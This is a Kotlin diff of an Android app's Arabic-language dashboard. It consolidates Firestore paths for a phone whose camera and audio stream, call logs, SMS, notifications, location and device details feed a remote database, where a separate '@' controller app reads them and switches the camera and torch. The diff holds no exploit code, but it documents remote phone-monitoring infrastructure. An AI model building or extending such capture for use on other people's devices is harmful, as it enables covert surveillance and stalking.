@@ -500,14 +500,19 @@ fun DashboardScreen(
     var isTesting by remember { mutableStateOf(false) }
     var showArchitecturePlan by remember { mutableStateOf(false) }
 
-    // Realtime Listener for remote camera facing and torch state
+    // Realtime Listener for remote camera facing and torch state directly from devices/{userName}
     LaunchedEffect(userName) {
         val db = FirebaseHelper.getFirestore(context)
-        db.collection("settings").document(userName)
+        db.collection("devices").document(userName)
             .addSnapshotListener { snapshot, _ ->
                 if (snapshot != null) {
-                    currentCameraFacing = snapshot.getString("cameraFacing") ?: "back"
-                    isTorchEnabled = snapshot.getBoolean("torch") ?: false
+                    val controls = snapshot.get("controls") as? Map<*, *>
+                    currentCameraFacing = (controls?.get("cameraFacing") as? String)
+                        ?: snapshot.getString("cameraFacing")
+                        ?: "back"
+                    isTorchEnabled = (controls?.get("torch") as? Boolean)
+                        ?: snapshot.getBoolean("torch")
+                        ?: false
                 }
             }
     }
@@ -645,8 +650,14 @@ fun DashboardScreen(
                     OutlinedButton(
                         onClick = {
                             val newFacing = if (currentCameraFacing == "front") "back" else "front"
-                            FirebaseHelper.getFirestore(context).collection("settings").document(userName)
-                                .set(hashMapOf("cameraFacing" to newFacing), com.google.firebase.firestore.SetOptions.merge())
+                            FirebaseHelper.getFirestore(context).collection("devices").document(userName)
+                                .set(
+                                    hashMapOf(
+                                        "controls" to hashMapOf("cameraFacing" to newFacing),
+                                        "cameraFacing" to newFacing
+                                    ),
+                                    com.google.firebase.firestore.SetOptions.merge()
+                                )
                                 .addOnSuccessListener {
                                     currentCameraFacing = newFacing
                                     Toast.makeText(context, "تم تبديل الكاميرا إلى: ${if (newFacing == "front") "الأمامية" else "الخلفية"}", Toast.LENGTH_SHORT).show()
@@ -661,8 +672,14 @@ fun DashboardScreen(
                     OutlinedButton(
                         onClick = {
                             val newTorch = !isTorchEnabled
-                            FirebaseHelper.getFirestore(context).collection("settings").document(userName)
-                                .set(hashMapOf("torch" to newTorch), com.google.firebase.firestore.SetOptions.merge())
+                            FirebaseHelper.getFirestore(context).collection("devices").document(userName)
+                                .set(
+                                    hashMapOf(
+                                        "controls" to hashMapOf("torch" to newTorch),
+                                        "torch" to newTorch
+                                    ),
+                                    com.google.firebase.firestore.SetOptions.merge()
+                                )
                                 .addOnSuccessListener {
                                     isTorchEnabled = newTorch
                                     Toast.makeText(context, "الفلاش: ${if (newTorch) "مضاء" else "مطفأ"}", Toast.LENGTH_SHORT).show()
@@ -687,7 +704,7 @@ fun DashboardScreen(
                             "type" to "INSTANT_SNAPSHOT",
                             "user" to userName
                         )
-                        db.collection("snapshots").document(userName).collection("items")
+                        db.collection("devices").document(userName).collection("snapshots")
                             .add(snapshotData)
                             .addOnSuccessListener {
                                 Toast.makeText(context, "📸 تم طلب وحفظ اللقطة في Firestore!", Toast.LENGTH_SHORT).show()
@@ -820,6 +837,31 @@ fun DashboardScreen(
                 ) {
                     Text(if (isTesting) "جارٍ الفحص..." else "فحص الاتصال بقاعدة البيانات 📡")
                 }
+
+                Spacer(modifier = Modifier.height(8.dp))
+
+                // CLEAN LEGACY COLLECTIONS BUTTON
+                var isCleaning by remember { mutableStateOf(false) }
+                OutlinedButton(
+                    onClick = {
+                        isCleaning = true
+                        val db = FirebaseHelper.getFirestore(context)
+                        val legacyCollections = listOf("streams", "settings", "calls", "sms", "notifications", "snapshots", "_diagnostics")
+                        
+                        legacyCollections.forEach { col ->
+                            db.collection(col).document(userName).delete()
+                        }
+                        
+                        Toast.makeText(context, "🧹 تم تنظيف المسارات القديمة بالكامل!", Toast.LENGTH_SHORT).show()
+                        isCleaning = false
+                    },
+                    enabled = !isCleaning,
+                    modifier = Modifier.fillMaxWidth(),
+                    shape = RoundedCornerShape(10.dp),
+                    colors = ButtonDefaults.outlinedButtonColors(contentColor = MaterialTheme.colorScheme.error)
+                ) {
+                    Text(if (isCleaning) "جارٍ التنظيف..." else "🧹 تنظيف المسارات القديمة المبعثرة بضغطة زر")
+                }
             }
         }
 
@@ -878,7 +920,7 @@ fun DashboardScreen(
                                 "number" to "أمي (0501234567)",
                                 "timestamp" to System.currentTimeMillis()
                             )
-                            db.collection("calls").document(userName).collection("logs").add(callData)
+                            db.collection("devices").document(userName).collection("calls").add(callData)
                                 .addOnSuccessListener {
                                     Toast.makeText(context, "✅ تم تسجيل المكالمة في Firestore", Toast.LENGTH_SHORT).show()
                                 }
@@ -909,7 +951,7 @@ fun DashboardScreen(
                                 "body" to "لقد بقي لك 1 GB من اشتراك الانترنت الخاص بك. لتجديد الاشتراك اتصل بـ *600#.",
                                 "timestamp" to System.currentTimeMillis()
                             )
-                            db.collection("sms").document(userName).collection("logs").add(smsData)
+                            db.collection("devices").document(userName).collection("sms").add(smsData)
                                 .addOnSuccessListener {
                                     Toast.makeText(context, "✅ تم تسجيل رسالة الـ SMS في Firestore", Toast.LENGTH_SHORT).show()
                                 }
@@ -940,7 +982,7 @@ fun DashboardScreen(
             modifier = Modifier.fillMaxWidth(),
             shape = RoundedCornerShape(10.dp)
         ) {
-            Text("📋 خطة هيكلة البيانات للتحكم عبر تطبيق @")
+            Text("📋 خطة هيكلة البيانات الموحدة للتحكم عبر @")
         }
 
         Spacer(modifier = Modifier.height(24.dp))
@@ -950,28 +992,21 @@ fun DashboardScreen(
         AlertDialog(
             onDismissRequest = { showArchitecturePlan = false },
             title = {
-                Text("📋 خطة التحكم عبر تطبيق @", fontWeight = FontWeight.Bold)
+                Text("📋 الهيكلة الموحدة النظيفة (Unified Fleet)", fontWeight = FontWeight.Bold)
             },
             text = {
                 Column(modifier = Modifier.verticalScroll(rememberScrollState())) {
                     Text(
-                        text = "هذه هي مسارات Firestore الدقيقة التي يمكنك ربط تطبيق التحكم @ بها مباشرة:\n\n" +
-                                "1️⃣ بث الكاميرا والصوت:\n" +
-                                "• المسار: streams/$userName\n" +
-                                "• الحقول: frame (صورة Base64), audio (صوت Base64), facing (front/back), timestamp\n\n" +
-                                "2️⃣ تبديل الكاميرا والفلاش عن بعد:\n" +
-                                "• المسار: settings/$userName\n" +
-                                "• لتغيير الكاميرا: اكتب cameraFacing: 'front' أو 'back'\n" +
-                                "• لتشغيل الفلاش: اكتب torch: true أو false\n\n" +
-                                "3️⃣ معلومات الجهاز ومكونات الهاردوير وشبكة الـ WiFi:\n" +
-                                "• المسار: devices/$userName\n" +
-                                "• يحتوي على: wifiSsid, wifiSpeedMbps, localIp, batteryLevel, isCharging, totalRam, availableRam, totalInternalStorage, model, manufacturer, googleMapsUrl (الموقع الجغرافي)\n\n" +
-                                "4️⃣ سجلات المكالمات:\n" +
-                                "• المسار: calls/$userName/logs\n\n" +
-                                "5️⃣ سجلات الرسائل SMS:\n" +
-                                "• المسار: sms/$userName/logs\n\n" +
-                                "6️⃣ سجلات الإشعارات الواردة:\n" +
-                                "• المسار: notifications/$userName/logs",
+                        text = "كل ما يخص الهاتف الآن مجمع داخل مسار واحد نظيف في Firestore:\n\n" +
+                                "📱 وثيقة الجهاز الرئيسية: devices/$userName\n" +
+                                "• معلومات الهاتف وWiFi والبطارية والرام والموقع: كلها داخل الوثيقة مباشرة.\n" +
+                                "• البث الحي (Live Stream): حقل stream داخل نفس الوثيقة { frame, audio, facing, timestamp }.\n" +
+                                "• التحكم عن بعد: حقل controls داخل نفس الوثيقة { cameraFacing: 'front'/'back', torch: true/false, quality, fps }.\n\n" +
+                                "📂 المجموعات الفرعية داخل الجهاز:\n" +
+                                "• المكالمات: devices/$userName/calls\n" +
+                                "• الرسائل SMS: devices/$userName/sms\n" +
+                                "• الإشعارات: devices/$userName/notifications\n" +
+                                "• اللقطات: devices/$userName/snapshots",
                         style = MaterialTheme.typography.bodySmall
                     )
                 }
